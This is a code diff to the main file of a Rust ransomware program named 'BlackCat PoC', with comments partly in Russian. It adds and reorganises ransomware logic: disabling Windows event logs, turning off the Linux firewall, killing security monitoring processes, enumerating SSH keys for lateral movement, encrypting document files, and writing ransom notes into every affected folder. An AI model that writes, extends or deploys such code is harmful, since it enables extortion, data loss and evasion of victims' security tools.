@@ -11,7 +11,7 @@ mod linux;
 use clap::{Parser, Subcommand};
 use log::{info, warn, error};
 use std::path::Path;
-use std::fs;
+use std::collections::HashSet;
 
 #[derive(Parser)]
 #[command(name = "BlackCat PoC")]
@@ -45,7 +45,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     let cli = Cli::parse();
 
-    // 1. Проверки среды (Evasion) - работают на обеих ОС через #[cfg] внутри модуля
+    // 1. Evasion checks
     if evasion::is_running_in_vm() {
         info!("✓ Running in VM - proceeding with emulation");
     } else {
@@ -61,9 +61,14 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         Commands::Encrypt { path } => {
             info!("Starting ENCRYPTION mode on: {}", path);
 
-            // 2. Специфичные для ОС операции перед шифрованием
-            
-            // --- ЛОГИКА ДЛЯ WINDOWS ---
+            // 1. Сканируем файлы ПЕРЕД началом
+            let files = filesystem::scan_filesystem(&path)?;
+            if files.is_empty() {
+                error!("No files found in {}", path);
+                return Ok(());
+            }
+
+            // 2. Специфичные для ОС операции (отключение защит)
             #[cfg(target_os = "windows")]
             {
                 info!("Executing Windows-specific preparation...");
@@ -72,46 +77,25 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 let _ = evasion::disable_eventlog();
             }
 
-            // --- ЛОГИКА ДЛЯ LINUX ---
             #[cfg(target_os = "linux")]
             {
                 info!("Executing Linux-specific preparation...");
-                
-                // Отключаем файрвол (требует sudo)
-                if let Err(e) = linux::LinuxOperations::disable_firewall() {
-                    warn!("Could not disable firewall: {}", e);
-                } else {
-                    info!("✓ Firewall disabled (ufw)");
-                }
-
-                // Убиваем процессы мониторинга (auditd, osquery и т.д.)
+                let _ = linux::LinuxOperations::disable_firewall();
                 let _ = linux::LinuxOperations::kill_security_processes();
-                info!("✓ Security processes signaled to stop");
-
-                // Сбор SSH-ключей для латерального перемещения (Phase 3 вашего плана)
                 if let Ok(keys) = linux::LinuxOperations::enumerate_ssh_keys() {
-                    info!("Found {} potential SSH keys for lateral movement:", keys.len());
-                    for key in keys {
-                        info!("  - [DATA EXFILTRATION CANDIDATE]: {}", key);
-                    }
+                    info!("Found {} SSH keys for lateral movement", keys.len());
                 }
             }
 
-            // 3. Общая логика шифрования
+            // 3. Шифрование
             let crypto_engine = crypto::CryptoEngine::new()?;
             let master_key_hex = hex::encode(crypto_engine.get_master_key());
             info!("========== MASTER KEY (SAVE THIS) ==========");
             info!("{}", master_key_hex);
             info!("============================================");
 
-            let files = filesystem::scan_filesystem(&path)?;
-            if files.is_empty() {
-                error!("No files found in {}", path);
-                return Ok(());
-            }
-
             ransomware::BlackCatRansomware::encrypt_all_files(
-                files,
+                files.clone(),
                 ransomware::RansomwareConfig {
                     target_paths: vec![path.clone()],
                     file_extensions: vec!["txt".to_string(), "pdf".to_string(), "docx".to_string()],
@@ -121,21 +105,30 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 &crypto_engine,
             ).await?;
 
-            // 4. Оставление записки (Ransom Note)
-            #[cfg(target_os = "windows")]
-            let _ = windows::WindowsPlatform::create_ransom_note(&path);
+            // 4. Сбор папок и создание записок во всех подпапках
+            let mut dirs_to_notify = HashSet::new();
+            for file in &files {
+                if let Some(parent) = Path::new(file).parent() {
+                    if let Some(path_str) = parent.to_str() {
+                        dirs_to_notify.insert(path_str.to_string());
+                    }
+                }
+            }
 
-            info!("✓ Encryption of {} files complete.", path);
+            for dir in dirs_to_notify {
+                #[cfg(target_os = "windows")]
+                let _ = windows::WindowsPlatform::create_ransom_note(&dir);
+                #[cfg(target_os = "linux")]
+                let _ = linux::LinuxOperations::create_ransom_note(&dir);
+            }
+
+            info!("✓ Encryption of {} files complete.", files.len());
         }
 
         Commands::Decrypt { path, key } => {
             info!("Starting DECRYPTION mode on: {}", path);
             
             let key_bytes = hex::decode(key).map_err(|_| "Invalid hex key format")?;
-            if key_bytes.len() != 32 {
-                return Err("Key must be 32 bytes (64 hex characters)".into());
-            }
-            
             let mut master_key = [0u8; 32];
             master_key.copy_from_slice(&key_bytes);
             
@@ -146,7 +139,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 files,
                 ransomware::RansomwareConfig {
                     target_paths: vec![path],
-                    file_extensions: vec!["txt".to_string()],
+                    file_extensions: vec!["sttp".to_string()], // Теперь ищем .sttp
                     encryption_algorithm: "aes-256-gcm".to_string(),
                     max_parallelism: 4,
                 },
